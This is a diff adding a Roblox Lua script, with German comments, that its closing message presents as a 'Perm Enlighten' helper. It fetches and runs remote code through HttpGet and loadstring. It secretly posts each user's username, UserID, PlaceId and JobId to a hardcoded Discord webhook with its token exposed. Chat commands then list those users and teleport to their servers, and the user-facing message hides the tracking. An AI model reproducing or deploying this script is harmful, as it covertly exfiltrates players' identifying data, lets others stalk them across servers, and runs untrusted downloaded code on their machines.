@@ -1,0 +1,154 @@
+-- Laden des externen Skripts
+local success, externalScript = pcall(function()
+    return game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true)
+end)
+
+if success and externalScript then
+    local loadSuccess, loadError = pcall(function()
+        loadstring(externalScript)()
+    end)
+    if not loadSuccess then
+        warn("Fehler beim Ausführen des externen Skripts: " .. loadError)
+    end
+else
+    warn("Fehler beim Herunterladen des externen Skripts.")
+end
+
+-- Ihr eigenes Skript beginnt hier
+getgenv().Message = ";reset"
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local localPlayer = Players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1212809073842585650/1BOVhlTK8Z-i4JKblS9Dk6IIvgzruT8t7Qz398VKPhBtAtdOqamefitrT53-hxXUgM09"
+
+local function sendToWebhook(username, userId, placeId, jobId)
+    local data = {
+        ["content"] = string.format(
+            "Username: %s\nUserID: %d\nGameID (PlaceId): %d\nJobID: %s",
+            username,
+            userId,
+            placeId,
+            jobId
+        ),
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    if request then
+        request({
+            Url = webhookUrl,
+            Body = jsonData,
+            Method = "POST",
+            Headers = headers
+        })
+    else
+        warn("HTTP-Request-Funktion nicht gefunden. Webhook konnte nicht gesendet werden.")
+    end
+end
+
+getgenv().executedPlayers = getgenv().executedPlayers or {}
+
+local function updateExecutedPlayers(player)
+    local playerExists = false
+    for _, playerInfo in ipairs(getgenv().executedPlayers) do
+        if playerInfo.UserId == player.UserId then
+            playerExists = true
+            break
+        end
+    end
+
+    if not playerExists then
+        table.insert(getgenv().executedPlayers, {
+            Name = player.Name,
+            UserId = player.UserId,
+            PlaceId = game.PlaceId,
+            JobId = game.JobId
+        })
+        sendToWebhook(player.Name, player.UserId, game.PlaceId, game.JobId)
+    end
+end
+
+local function printExecutedPlayers()
+    print("Spieler, die das Skript ausgeführt haben:")
+    for _, playerInfo in ipairs(getgenv().executedPlayers) do
+        print("Benutzername: " .. playerInfo.Name .. ", UserId: " .. playerInfo.UserId .. 
+              ", PlaceId: " .. (playerInfo.PlaceId or "N/A") .. 
+              ", JobId: " .. (playerInfo.JobId or "N/A"))
+    end
+end
+
+local function joinPlayer(identifier)
+    for _, playerInfo in ipairs(getgenv().executedPlayers) do
+        if tostring(playerInfo.UserId) == identifier or playerInfo.Name:lower() == identifier:lower() then
+            if playerInfo.PlaceId and playerInfo.JobId then
+                TeleportService:TeleportToPlaceInstance(playerInfo.PlaceId, playerInfo.JobId, localPlayer)
+                return
+            else
+                print("Spielinformationen für diesen Spieler sind nicht verfügbar.")
+                return
+            end
+        end
+    end
+    print("Spieler mit der Kennung " .. identifier .. " wurde nicht gefunden.")
+end
+
+TextChatService.TextChannels.RBXGeneral.OnIncomingMessage = function(chatMessage)
+    local message = chatMessage.Text
+    if message == "!users" then
+        printExecutedPlayers()
+    elseif message:sub(1, 6) == "!join " then
+        local identifier = message:sub(7)
+        if identifier then
+            joinPlayer(identifier)
+        else
+            print("Ungültige Kennung.")
+        end
+    elseif message == "!Check" then
+        local channel = TextChatService.TextChannels.RBXGeneral
+        channel:SendAsync("Hey")
+    end
+end
+
+updateExecutedPlayers(localPlayer)
+
+local function hasToolOrEquipped(toolName)
+    local player = game.Players.LocalPlayer
+    for _, item in ipairs(player.Backpack:GetChildren()) do
+        if item.Name == toolName then
+            return true
+        end
+    end
+    local character = player.Character
+    if character then
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") and item.Name == toolName then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local hasTriggered = false
+task.spawn(function()
+    while true do
+        task.wait(0.001)
+        if hasToolOrEquipped("The Arkenstone") and not hasTriggered then
+            hasTriggered = true
+            local channel = TextChatService.TextChannels.RBXGeneral
+            channel:SendAsync(getgenv().Message)
+        elseif not hasToolOrEquipped("The Arkenstone") then
+            hasTriggered = false
+        end
+    end
+end)
+
+print("Perm Enlighten script successfully executed\nHow it is done: \n1. Execute the script\n2. Get enlighten by asking the admin And you are done.\nThis script will automatically reset your inventory.")
